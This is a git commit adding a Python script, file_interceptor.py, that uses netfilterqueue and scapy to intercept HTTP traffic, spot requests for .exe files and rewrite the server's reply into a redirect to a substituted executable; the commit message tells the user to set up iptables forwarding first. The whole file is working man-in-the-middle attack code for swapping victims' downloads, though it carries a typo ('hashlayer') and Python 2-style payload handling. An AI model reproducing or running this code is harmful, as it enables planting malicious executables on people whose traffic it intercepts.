9681af600fc28c76469a84ba5a766ed7ef4cd5a2
Рафаэль <rafael@MacB.local>
2019-08-07 19:40:10 +0100

    Simple file .exe file interceptor.Before start you must change iptables in order to enable forwarding to the queue.

---
+++ file_interceptor.py
@@ -0,0 +1,32 @@
+import netfilterqueue
+import scapy.all as scapy
+
+ack_list = []
+
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
+
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.hashlayer(scapy.Raw):
+        if scapy_packet[scapy.TCP].dport == 80:
+            if ".exe" in scapy_packet[scapy.Raw].load:
+                print('Request to exe file')
+                ack_list.append(scapy_packet[scapy.TCP].ack)
+        elif scapy_packet[scapy.TCP].sport == 80:
+            if scapy_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(scapy_packet[scapy.TCP].seq)
+                print("Replacing the file")
+                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\n Location: http://link to the file location.exe\n\n")
+                packet.set_payload(str(modified_packet))
+
+    packet.accept()
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
